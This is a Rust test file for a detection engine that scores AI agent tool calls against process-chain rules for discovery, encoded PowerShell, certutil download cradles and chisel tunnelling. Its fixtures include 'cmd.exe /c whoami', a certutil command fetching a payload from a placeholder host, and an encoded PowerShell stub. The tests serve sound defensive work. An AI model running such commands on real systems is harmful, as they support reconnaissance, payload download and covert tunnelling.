use super::*;

#[test]
fn a_declared_role_keeps_authored_text_out_of_the_command_candidates() {
    use crate::v2::declared_role_selector_tests::Call;
    use serde_json::{Value, json};
    use telltale_schema::observation::{ToolKind, ToolOperation};

    let text = "cmd.exe /c whoami";
    let encoded = json!({"command": text}).to_string();
    let candidates = |operation| {
        let observation = Call {
            name: "apply_patch",
            arguments: Value::String(encoded.clone()),
            searchable: Some(&encoded),
            command: Some(text),
            operation,
        }
        .observation();
        command_candidates(&observation)
            .into_iter()
            .map(str::to_owned)
            .collect::<Vec<_>>()
    };
    // With no role the facet and the argument text are command lines.
    assert_eq!(candidates(None), [text.to_owned(), encoded.clone()]);
    let write = ToolOperation::new(ToolKind::FileWrite);
    assert_eq!(
        candidates(Some(write.clone())),
        [text.to_owned(), encoded.clone()]
    );
    // The command member holds authored text: no candidate, as for the
    // Claude `Write` reference, whose arguments are an object.
    assert!(candidates(Some(write.clone().with_authored_key("command"))).is_empty());
    // Another member is authored: the command facet remains a candidate.
    assert_eq!(
        candidates(Some(write.with_authored_key("file_text"))),
        [text.to_owned()]
    );
}

#[test]
fn explicit_parent_child_uses_the_tool_observation_identity() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = requested_command("cmd.exe /c whoami", "explicit");
    let results =
        evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
            .unwrap();
    let matched = result(&results, "procchain.discovery.cmd_whoami");

    assert_eq!(
        matched.evaluation_status(),
        EvaluationStatus::EvaluatedMatch
    );
    assert_eq!(matched.detector().kind(), DetectorKind::ProcessChain);
    assert_eq!(matched.detector().rule_version(), Some(1));
    assert_eq!(matched.observation_ids(), [observation.observation_id()]);
    assert_eq!(matched.session_id(), Some("session:process-v2"));
    assert_eq!(matched.correlation_scope(), CorrelationScope::Process);
    assert_eq!(
        matched
            .capability_context()
            .expect("capability context")
            .resolve(CapabilityId::ToolCall),
        CapabilityAvailability::Supported
    );
    assert_eq!(observation.kind(), ObservationFamily::Tool);
    assert_ne!(observation.stage(), ObservationStage::ProcessObserved);
}

#[test]
fn tool_derived_matcher_inputs_use_only_canonical_session_scope() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = timed_command(
        "cmd.exe /c hostname",
        "session-scope",
        Some("opaque|session:value"),
        Some("2026-09-17T10:00:00Z"),
    );
    let inputs = command_derived_process_matcher_inputs(&observation);
    assert!(!inputs.is_empty());
    assert!(
        inputs
            .iter()
            .all(|input| input.host.is_none() && input.user.is_none())
    );

    let mut budget = super::super::super::session::RetentionBudget::new();
    let matches = evaluate_tool_process_chain_matches(
        &rules,
        &observation,
        &ProcessChainContext::default(),
        0,
        &mut budget,
    )
    .unwrap();
    assert!(
        matches
            .iter()
            .all(|matched| matched.result.session_id() == Some("opaque|session:value"))
    );
}

#[test]
fn standalone_command_indicator_uses_the_same_path() {
    let results = default_results("powershell -enc AAAAAAAAAAAAAAAAAAAAAAAA", "standalone");
    let matched = result(&results, "procchain.execution.encoded_powershell");
    assert_eq!(matched.detector().kind(), DetectorKind::ProcessChain);
    assert_eq!(
        matched.evaluation_status(),
        EvaluationStatus::EvaluatedMatch
    );
}

#[test]
fn zero_risk_match_materializes_an_ordinary_signal_and_finding() {
    let results = default_results("cmd.exe /c hostname", "informational");
    let matched = result(&results, "procchain.discovery.cmd_hostname");
    assert_eq!(matched.risk_points(), Some(0));
    assert_eq!(matched.severity(), Severity::Informational);
    assert_eq!(matched.finding_kind(), FindingKind::ThreatHunt);

    let signal = matched.signal().unwrap().expect("signal");
    let finding = signal.finding().expect("finding");
    assert_eq!(signal.risk_points(), Some(0));
    assert_eq!(finding.risk_points(), Some(0));
    assert_eq!(finding.detectors()[0].kind(), DetectorKind::ProcessChain);
    assert_eq!(finding.observation_ids(), matched.observation_ids());
}

#[test]
fn inferred_parent_weakens_confidence_without_runtime_identity() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = tool(
        ObservationStage::ToolRequested,
        None,
        None,
        Some(JsonValue::string(
            "certutil -urlcache https://example.invalid/payload",
        )),
        "shell",
        "inferred",
    );
    let derived = command_derived_process_matcher_inputs(&observation);
    let input = derived
        .iter()
        .find(|input| input.child.normalized_name() == "certutil")
        .expect("derived matcher input");
    assert!(input.parent_inferred);
    assert_eq!(input.parent.normalized_name(), "cmd");
    assert_eq!(input.parent.pid, None);
    assert_eq!(input.child.pid, None);
    assert_eq!(input.source_event_id, None);

    let results =
        evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
            .unwrap();
    assert_eq!(
        result(&results, "procchain.c2.certutil_download_cradle").confidence(),
        Some(Confidence::Medium)
    );
    assert_eq!(observation.kind(), ObservationFamily::Tool);
}

#[test]
fn caller_context_softens_but_does_not_remove_a_match() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = requested_command("cmd.exe /c chisel", "context");
    let baseline =
        evaluate_tool_process_chains(&rules, &observation, &ProcessChainContext::default())
            .unwrap();
    let mut context = ProcessChainContext::default();
    context.approved_rmm_products.insert("chisel".to_owned());
    let softened = evaluate_tool_process_chains(&rules, &observation, &context).unwrap();

    let baseline = result(&baseline, "procchain.c2.cmd_chisel");
    let softened = result(&softened, "procchain.c2.cmd_chisel");
    assert_eq!(
        (baseline.risk_points(), baseline.severity()),
        (Some(85), Severity::Critical)
    );
    assert_eq!(
        (softened.risk_points(), softened.severity()),
        (Some(55), Severity::High)
    );
    assert_eq!(
        softened.evaluation_status(),
        EvaluationStatus::EvaluatedMatch
    );
}

#[test]
fn command_line_gated_match_is_not_softened() {
    let rules = load_default_process_chain_rules().unwrap();
    let observation = requested_command(
        "cmd.exe /c certutil -urlcache https://example.invalid/payload",
        "gated",
    );
    let mut context = ProcessChainContext::default();
    context.approved_rmm_products.insert("certutil".to_owned());
    let results = evaluate_tool_process_chains(&rules, &observation, &context).unwrap();
    let matched = result(&results, "procchain.c2.certutil_download_cradle");
    assert_eq!(matched.risk_points(), Some(58));
    assert_eq!(matched.severity(), Severity::High);
}
